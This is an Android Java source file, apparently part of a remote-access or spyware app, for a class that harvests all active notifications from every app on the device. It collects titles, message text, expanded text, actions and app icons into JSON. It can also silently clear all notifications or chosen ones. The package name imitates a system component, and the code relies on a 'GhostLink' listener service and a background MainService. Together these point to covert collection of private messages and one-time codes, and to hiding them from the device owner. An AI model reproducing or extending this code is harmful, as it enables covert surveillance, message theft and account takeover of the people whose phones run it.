package com.android.background.services.helpers;

import android.app.Notification;
import android.content.Context;
import android.content.pm.PackageManager;
import android.graphics.Bitmap;
import android.graphics.Canvas;
import android.graphics.drawable.Drawable;
import android.os.Build;
import android.service.notification.StatusBarNotification;
import android.util.Base64;
import android.util.Log;

import com.android.background.services.MainService;
import com.android.background.services.GhostLinkNotificationListenerService;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.ByteArrayOutputStream;
import java.util.ArrayList;
import java.util.List;

public class NotificationsManager {

    private static final String TAG = "NotificationsManager";

    public static JSONObject getNotifications() {
        try {
            JSONObject result = new JSONObject();
            JSONArray notificationsList = new JSONArray();

            // Lấy danh sách notifications hiện tại
            List<StatusBarNotification> activeNotifications = getActiveNotifications();

            if (activeNotifications != null) {
                for (StatusBarNotification sbn : activeNotifications) {
                    try {
                        JSONObject notification = new JSONObject();
                        Notification n = sbn.getNotification();

                        // Thông tin cơ bản
                        String packageName = sbn.getPackageName();
                        notification.put("packageName", packageName);

                        // Thông tin để xóa notification cụ thể
                        String notificationKey = sbn.getKey();
                        notification.put("notificationKey", notificationKey);

                        int notificationId = sbn.getId();
                        notification.put("notificationId", notificationId);

                        String tag = sbn.getTag();
                        if (tag != null) {
                            notification.put("tag", tag);
                        }

                        // Tên ứng dụng
                        String appName = getAppName(packageName);
                        notification.put("appName", appName);

                        // Icon ứng dụng (base64)
                        String appIcon = getAppIconBase64(packageName);
                        if (appIcon != null) {
                            notification.put("appIcon", appIcon);
                        }

                        // Thông tin notification
                        if (n.extras != null) {
                            String title = n.extras.getString(Notification.EXTRA_TITLE);
                            if (title != null) {
                                notification.put("title", title);
                            }

                            String text = n.extras.getString(Notification.EXTRA_TEXT);
                            if (text != null) {
                                notification.put("text", text);
                            }

                            String bigText = n.extras.getString(Notification.EXTRA_BIG_TEXT);
                            if (bigText != null) {
                                notification.put("bigText", bigText);
                            }

                            String subText = n.extras.getString(Notification.EXTRA_SUB_TEXT);
                            if (subText != null) {
                                notification.put("subText", subText);
                            }

                            String infoText = n.extras.getString(Notification.EXTRA_INFO_TEXT);
                            if (infoText != null) {
                                notification.put("infoText", infoText);
                            }

                            // ✅ Ticker text: lấy trực tiếp (không nằm trong extras)
                            if (n.tickerText != null) {
                                notification.put("tickerText", n.tickerText.toString());
                            }

                            // ✅ Style: Android không expose EXTRA_STYLE
                            // Có thể tham khảo key ẩn "android.template" (VD: BigTextStyle, BigPictureStyle...)
                            String styleClass = n.extras.getString("android.template"); // có thể null
                            if (styleClass != null) {
                                notification.put("style", styleClass);
                            }

                            // Thông tin về actions
                            if (n.actions != null && n.actions.length > 0) {
                                JSONArray actionsArray = new JSONArray();
                                for (Notification.Action action : n.actions) {
                                    JSONObject actionObj = new JSONObject();
                                    if (action.title != null) {
                                        actionObj.put("title", action.title.toString());
                                    }
                                    if (action.actionIntent != null) {
                                        actionObj.put("hasIntent", true);
                                    }
                                    actionsArray.put(actionObj);
                                }
                                notification.put("actions", actionsArray);
                            }

                            // Thông tin về category
                            String category = n.category;
                            if (category != null) {
                                notification.put("category", category);
                            }

                            // Thông tin về group
                            String groupKey = n.getGroup();
                            if (groupKey != null) {
                                notification.put("groupKey", groupKey);
                            }

                            // Thông tin về sort key
                            String sortKey = n.getSortKey();
                            if (sortKey != null) {
                                notification.put("sortKey", sortKey);
                            }
                        } else {
                            // extras null nhưng vẫn thử lấy ticker
                            if (n.tickerText != null) {
                                notification.put("tickerText", n.tickerText.toString());
                            }
                        }

                        // Thời gian
                        long postTime = sbn.getPostTime();
                        notification.put("postTime", postTime);

                        // Flags
                        boolean isOngoing = (n.flags & Notification.FLAG_ONGOING_EVENT) != 0;
                        notification.put("isOngoing", isOngoing);

                        boolean isClearable = (n.flags & Notification.FLAG_NO_CLEAR) == 0;
                        notification.put("isClearable", isClearable);

                        notificationsList.put(notification);

                    } catch (JSONException e) {
                        Log.e(TAG, "Error creating notification JSON: " + e.getMessage());
                    } catch (Throwable t) {
                        // Phòng các edge-case từ OEM
                        Log.e(TAG, "Unexpected error when parsing a notification: " + t.getMessage());
                    }
                }
            }

            result.put("notificationsList", notificationsList);
            return result;

        } catch (JSONException e) {
            Log.e(TAG, "Error creating notifications JSON: " + e.getMessage());
            e.printStackTrace();
        }
        return null;
    }

    private static List<StatusBarNotification> getActiveNotifications() {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                // Ưu tiên sử dụng NotificationListenerService nếu có
                if (GhostLinkNotificationListenerService.isServiceRunning()) {
                    List<StatusBarNotification> notifications =
                            GhostLinkNotificationListenerService.getInstance().getAllActiveNotifications();
                    if (notifications != null && !notifications.isEmpty()) {
                        Log.d(TAG, "Got " + notifications.size() + " notifications from NotificationListenerService");
                        return notifications;
                    }
                }

                // Fallback: Sử dụng NotificationManager
                Context context = MainService.getContextOfApplication();
                if (context != null) {
                    android.app.NotificationManager notificationManager =
                            (android.app.NotificationManager) context.getSystemService(Context.NOTIFICATION_SERVICE);

                    if (notificationManager != null) {
                        StatusBarNotification[] notifications = notificationManager.getActiveNotifications();
                        List<StatusBarNotification> result = new ArrayList<>();
                        for (StatusBarNotification sbn : notifications) {
                            result.add(sbn);
                        }
                        Log.d(TAG, "Got " + result.size() + " notifications from NotificationManager");
                        return result;
                    }
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Error getting active notifications: " + e.getMessage());
            e.printStackTrace();
        }
        return new ArrayList<>();
    }

    private static String getAppName(String packageName) {
        try {
            Context context = MainService.getContextOfApplication();
            if (context != null) {
                PackageManager pm = context.getPackageManager();
                return pm.getApplicationLabel(pm.getApplicationInfo(packageName, 0)).toString();
            }
        } catch (Exception e) {
            Log.e(TAG, "Error getting app name for " + packageName + ": " + e.getMessage());
        }
        return packageName;
    }

    private static String getAppIconBase64(String packageName) {
        try {
            Context context = MainService.getContextOfApplication();
            if (context != null) {
                PackageManager pm = context.getPackageManager();
                Drawable icon = pm.getApplicationIcon(packageName);

                // Chuyển Drawable thành Bitmap (handle trường hợp intrinsic size = -1)
                int width = icon.getIntrinsicWidth() > 0 ? icon.getIntrinsicWidth() : 128;
                int height = icon.getIntrinsicHeight() > 0 ? icon.getIntrinsicHeight() : 128;

                Bitmap bitmap = Bitmap.createBitmap(width, height, Bitmap.Config.ARGB_8888);
                Canvas canvas = new Canvas(bitmap);
                icon.setBounds(0, 0, canvas.getWidth(), canvas.getHeight());
                icon.draw(canvas);

                // Chuyển Bitmap thành base64
                ByteArrayOutputStream baos = new ByteArrayOutputStream();
                bitmap.compress(Bitmap.CompressFormat.PNG, 100, baos);
                byte[] imageBytes = baos.toByteArray();

                return Base64.encodeToString(imageBytes, Base64.NO_WRAP);
            }
        } catch (Exception e) {
            Log.e(TAG, "Error getting app icon for " + packageName + ": " + e.getMessage());
        }
        return null;
    }

    public static boolean clearAllNotifications() {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                // Ưu tiên sử dụng NotificationListenerService nếu có
                if (GhostLinkNotificationListenerService.isServiceRunning()) {
                    boolean result = GhostLinkNotificationListenerService.getInstance().clearAllNotifications();
                    if (result) {
                        Log.d(TAG, "Cleared notifications via NotificationListenerService");
                        return true;
                    }
                }

                // Fallback: Sử dụng NotificationManager
                Context context = MainService.getContextOfApplication();
                if (context != null) {
                    android.app.NotificationManager notificationManager =
                            (android.app.NotificationManager) context.getSystemService(Context.NOTIFICATION_SERVICE);

                    if (notificationManager != null) {
                        notificationManager.cancelAll();
                        Log.d(TAG, "Cleared notifications via NotificationManager");
                        return true;
                    }
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Error clearing notifications: " + e.getMessage());
            e.printStackTrace();
        }
        return false;
    }

    /**
     * Xóa notification cụ thể theo key
     */
    public static boolean clearNotification(String notificationKey) {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                // Ưu tiên sử dụng NotificationListenerService nếu có
                if (GhostLinkNotificationListenerService.isServiceRunning()) {
                    boolean result = GhostLinkNotificationListenerService.getInstance().clearNotification(notificationKey);
                    if (result) {
                        Log.d(TAG, "Cleared notification via NotificationListenerService: " + notificationKey);
                        return true;
                    }
                }

                // Fallback: Sử dụng NotificationManager
                Context context = MainService.getContextOfApplication();
                if (context != null) {
                    android.app.NotificationManager notificationManager =
                            (android.app.NotificationManager) context.getSystemService(Context.NOTIFICATION_SERVICE);

                    if (notificationManager != null) {
                        // Tìm notification theo key và xóa
                        StatusBarNotification[] notifications = notificationManager.getActiveNotifications();
                        for (StatusBarNotification sbn : notifications) {
                            if (sbn.getKey().equals(notificationKey)) {
                                notificationManager.cancel(sbn.getTag(), sbn.getId());
                                Log.d(TAG, "Cleared notification via NotificationManager: " + notificationKey);
                                return true;
                            }
                        }
                        Log.w(TAG, "Notification not found with key: " + notificationKey);
                    }
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Error clearing notification: " + e.getMessage());
            e.printStackTrace();
        }
        return false;
    }

    /**
     * Xóa notification theo package name và ID
     */
    public static boolean clearNotificationByPackageAndId(String packageName, int notificationId) {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                Context context = MainService.getContextOfApplication();
                if (context != null) {
                    android.app.NotificationManager notificationManager =
                            (android.app.NotificationManager) context.getSystemService(Context.NOTIFICATION_SERVICE);

                    if (notificationManager != null) {
                        notificationManager.cancel(packageName, notificationId);
                        Log.d(TAG, "Cleared notification by package and ID: " + packageName + ":" + notificationId);
                        return true;
                    }
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Error clearing notification by package and ID: " + e.getMessage());
            e.printStackTrace();
        }
        return false;
    }
}
